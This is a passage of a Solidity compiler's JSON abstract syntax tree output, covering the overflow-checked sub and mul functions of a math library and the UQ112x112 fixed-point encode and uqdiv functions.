															"hexValue": "64732d6d6174682d7375622d756e646572666c6f77",
															"id": 2235,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "444:23:7",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_03b20b9f6e6e7905f077509fd420fb44afc685f254bcefe49147296e1ba25590",
																"typeString": "literal_string \"ds-math-sub-underflow\""
															},
															"value": "ds-math-sub-underflow"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_03b20b9f6e6e7905f077509fd420fb44afc685f254bcefe49147296e1ba25590",
																"typeString": "literal_string \"ds-math-sub-underflow\""
															}
														],
														"id": 2226,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2328,
															2329
														],
														"referencedDeclaration": 2329,
														"src": "418:7:7",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 2236,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "418:50:7",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 2237,
												"nodeType": "ExpressionStatement",
												"src": "418:50:7"
											}
										]
									},
									"documentation": null,
									"id": 2239,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "sub",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2222,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2219,
												"name": "x",
												"nodeType": "VariableDeclaration",
												"scope": 2239,
												"src": "352:9:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2218,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "352:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2221,
												"name": "y",
												"nodeType": "VariableDeclaration",
												"scope": 2239,
												"src": "363:9:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2220,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "363:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "351:22:7"
									},
									"returnParameters": {
										"id": 2225,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2224,
												"name": "z",
												"nodeType": "VariableDeclaration",
												"scope": 2239,
												"src": "397:9:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2223,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "397:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "396:11:7"
									},
									"scope": 2268,
									"src": "339:136:7",
									"stateMutability": "pure",
									"superFunction": null,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 2266,
										"nodeType": "Block",
										"src": "550:80:7",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"id": 2262,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 2251,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 2249,
																	"name": "y",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2243,
																	"src": "568:1:7",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "==",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 2250,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "573:1:7",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "568:6:7",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "||",
															"rightExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 2261,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 2259,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"components": [
																			{
																				"argumentTypes": null,
																				"id": 2256,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftHandSide": {
																					"argumentTypes": null,
																					"id": 2252,
																					"name": "z",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 2246,
																					"src": "579:1:7",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "Assignment",
																				"operator": "=",
																				"rightHandSide": {
																					"argumentTypes": null,
																					"commonType": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					},
																					"id": 2255,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftExpression": {
																						"argumentTypes": null,
																						"id": 2253,
																						"name": "x",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 2241,
																						"src": "583:1:7",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"nodeType": "BinaryOperation",
																					"operator": "*",
																					"rightExpression": {
																						"argumentTypes": null,
																						"id": 2254,
																						"name": "y",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 2243,
																						"src": "587:1:7",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"src": "583:5:7",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"src": "579:9:7",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			}
																		],
																		"id": 2257,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "578:11:7",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "/",
																	"rightExpression": {
																		"argumentTypes": null,
																		"id": 2258,
																		"name": "y",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 2243,
																		"src": "592:1:7",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"src": "578:15:7",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "==",
																"rightExpression": {
																	"argumentTypes": null,
																	"id": 2260,
																	"name": "x",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2241,
																	"src": "597:1:7",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "578:20:7",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"src": "568:30:7",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "64732d6d6174682d6d756c2d6f766572666c6f77",
															"id": 2263,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "600:22:7",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_25a0ef6406c6af6852555433653ce478274cd9f03a5dec44d001868a76b3bfdd",
																"typeString": "literal_string \"ds-math-mul-overflow\""
															},
															"value": "ds-math-mul-overflow"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_25a0ef6406c6af6852555433653ce478274cd9f03a5dec44d001868a76b3bfdd",
																"typeString": "literal_string \"ds-math-mul-overflow\""
															}
														],
														"id": 2248,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2328,
															2329
														],
														"referencedDeclaration": 2329,
														"src": "560:7:7",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 2264,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "560:63:7",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 2265,
												"nodeType": "ExpressionStatement",
												"src": "560:63:7"
											}
										]
									},
									"documentation": null,
									"id": 2267,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "mul",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2244,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2241,
												"name": "x",
												"nodeType": "VariableDeclaration",
												"scope": 2267,
												"src": "494:9:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2240,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "494:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2243,
												"name": "y",
												"nodeType": "VariableDeclaration",
												"scope": 2267,
												"src": "505:9:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2242,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "505:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "493:22:7"
									},
									"returnParameters": {
										"id": 2247,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2246,
												"name": "z",
												"nodeType": "VariableDeclaration",
												"scope": 2267,
												"src": "539:9:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2245,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "539:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "538:11:7"
									},
									"scope": 2268,
									"src": "481:149:7",
									"stateMutability": "pure",
									"superFunction": null,
									"visibility": "internal"
								}
							],
							"scope": 2269,
							"src": "175:457:7"
						}
					],
					"src": "36:597:7"
				},
				"id": 7
			},
			"src/UQ112x112.sol": {
				"ast": {
					"absolutePath": "src/UQ112x112.sol",
					"exportedSymbols": {
						"UQ112x112": [
							2310
						]
					},
					"id": 2311,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 2270,
							"literals": [
								"solidity",
								"=",
								"0.5",
								".16"
							],
							"nodeType": "PragmaDirective",
							"src": "36:24:8"
						},
						{
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "library",
							"documentation": null,
							"fullyImplemented": true,
							"id": 2310,
							"linearizedBaseContracts": [
								2310
							],
							"name": "UQ112x112",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": true,
									"id": 2275,
									"name": "Q112",
									"nodeType": "VariableDeclaration",
									"scope": 2310,
									"src": "243:32:8",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint224",
										"typeString": "uint224"
									},
									"typeName": {
										"id": 2271,
										"name": "uint224",
										"nodeType": "ElementaryTypeName",
										"src": "243:7:8",
										"typeDescriptions": {
											"typeIdentifier": "t_uint224",
											"typeString": "uint224"
										}
									},
									"value": {
										"argumentTypes": null,
										"commonType": {
											"typeIdentifier": "t_rational_5192296858534827628530496329220096_by_1",
											"typeString": "int_const 5192...(26 digits omitted)...0096"
										},
										"id": 2274,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"lValueRequested": false,
										"leftExpression": {
											"argumentTypes": null,
											"hexValue": "32",
											"id": 2272,
											"isConstant": false,
											"isLValue": false,
											"isPure": true,
											"kind": "number",
											"lValueRequested": false,
											"nodeType": "Literal",
											"src": "267:1:8",
											"subdenomination": null,
											"typeDescriptions": {
												"typeIdentifier": "t_rational_2_by_1",
												"typeString": "int_const 2"
											},
											"value": "2"
										},
										"nodeType": "BinaryOperation",
										"operator": "**",
										"rightExpression": {
											"argumentTypes": null,
											"hexValue": "313132",
											"id": 2273,
											"isConstant": false,
											"isLValue": false,
											"isPure": true,
											"kind": "number",
											"lValueRequested": false,
											"nodeType": "Literal",
											"src": "272:3:8",
											"subdenomination": null,
											"typeDescriptions": {
												"typeIdentifier": "t_rational_112_by_1",
												"typeString": "int_const 112"
											},
											"value": "112"
										},
										"src": "267:8:8",
										"typeDescriptions": {
											"typeIdentifier": "t_rational_5192296858534827628530496329220096_by_1",
											"typeString": "int_const 5192...(26 digits omitted)...0096"
										}
									},
									"visibility": "internal"
								},
								{
									"body": {
										"id": 2290,
										"nodeType": "Block",
										"src": "382:57:8",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 2288,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 2282,
														"name": "z",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 2280,
														"src": "392:1:8",
														"typeDescriptions": {
															"typeIdentifier": "t_uint224",
															"typeString": "uint224"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint224",
															"typeString": "uint224"
														},
														"id": 2287,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 2284,
																	"name": "y",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2277,
																	"src": "404:1:8",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																],
																"id": 2283,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "396:7:8",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_uint224_$",
																	"typeString": "type(uint224)"
																},
																"typeName": "uint224"
															},
															"id": 2285,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "396:10:8",
															"typeDescriptions": {
																"typeIdentifier": "t_uint224",
																"typeString": "uint224"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "*",
														"rightExpression": {
															"argumentTypes": null,
															"id": 2286,
															"name": "Q112",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 2275,
															"src": "409:4:8",
															"typeDescriptions": {
																"typeIdentifier": "t_uint224",
																"typeString": "uint224"
															}
														},
														"src": "396:17:8",
														"typeDescriptions": {
															"typeIdentifier": "t_uint224",
															"typeString": "uint224"
														}
													},
													"src": "392:21:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint224",
														"typeString": "uint224"
													}
												},
												"id": 2289,
												"nodeType": "ExpressionStatement",
												"src": "392:21:8"
											}
										]
									},
									"documentation": null,
									"id": 2291,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "encode",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2278,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2277,
												"name": "y",
												"nodeType": "VariableDeclaration",
												"scope": 2291,
												"src": "337:9:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint112",
													"typeString": "uint112"
												},
												"typeName": {
													"id": 2276,
													"name": "uint112",
													"nodeType": "ElementaryTypeName",
													"src": "337:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "336:11:8"
									},
									"returnParameters": {
										"id": 2281,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2280,
												"name": "z",
												"nodeType": "VariableDeclaration",
												"scope": 2291,
												"src": "371:9:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint224",
													"typeString": "uint224"
												},
												"typeName": {
													"id": 2279,
													"name": "uint224",
													"nodeType": "ElementaryTypeName",
													"src": "371:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint224",
														"typeString": "uint224"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "370:11:8"
									},
									"scope": 2310,
									"src": "321:118:8",
									"stateMutability": "pure",
									"superFunction": null,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 2308,
										"nodeType": "Block",
										"src": "578:35:8",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 2306,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 2300,
														"name": "z",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 2298,
														"src": "588:1:8",
														"typeDescriptions": {
															"typeIdentifier": "t_uint224",
															"typeString": "uint224"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint224",
															"typeString": "uint224"
														},
														"id": 2305,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 2301,
															"name": "x",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 2293,
															"src": "592:1:8",
															"typeDescriptions": {
																"typeIdentifier": "t_uint224",
																"typeString": "uint224"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "/",
														"rightExpression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 2303,
																	"name": "y",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2295,
																	"src": "604:1:8",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																],
																"id": 2302,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "596:7:8",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_uint224_$",
																	"typeString": "type(uint224)"
																},
																"typeName": "uint224"
															},
															"id": 2304,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "596:10:8",
															"typeDescriptions": {
																"typeIdentifier": "t_uint224",
																"typeString": "uint224"
															}
														},
														"src": "592:14:8",
														"typeDescriptions": {
															"typeIdentifier": "t_uint224",
															"typeString": "uint224"
														}
													},
													"src": "588:18:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint224",
														"typeString": "uint224"
													}
												},
												"id": 2307,
												"nodeType": "ExpressionStatement",
												"src": "588:18:8"
											}
										]
									},
									"documentation": null,
									"id": 2309,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "uqdiv",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2296,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2293,
												"name": "x",
												"nodeType": "VariableDeclaration",
												"scope": 2309,
												"src": "522:9:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint224",
													"typeString": "uint224"
												},
												"typeName": {
													"id": 2292,
													"name": "uint224",
													"nodeType": "ElementaryTypeName",
													"src": "522:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint224",
														"typeString": "uint224"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2295,
												"name": "y",
												"nodeType": "VariableDeclaration",
												"scope": 2309,
												"src": "533:9:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint112",
													"typeString": "uint112"
												},
												"typeName": {
													"id": 2294,
													"name": "uint112",
													"nodeType": "ElementaryTypeName",
													"src": "533:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "521:22:8"
									},
									"returnParameters": {
										"id": 2299,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2298,
												"name": "z",
												"nodeType": "VariableDeclaration",
												"scope": 2309,
												"src": "567:9:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint224",
													"typeString": "uint224"
												},
												"typeName": {
													"id": 2297,
													"name": "uint224",
													"nodeType": "ElementaryTypeName",
													"src": "567:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint224",
														"typeString": "uint224"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "566:11:8"
									},
									"scope": 2310,
									"src": "507:106:8",
									"stateMutability": "pure",
									"superFunction": null,
									"visibility": "internal"
								}
							],
							"scope": 2311,
							"src": "219:396:8"
						}
					],
					"src": "36:580:8"
				},
				"id": 8
			}
		}
	}
}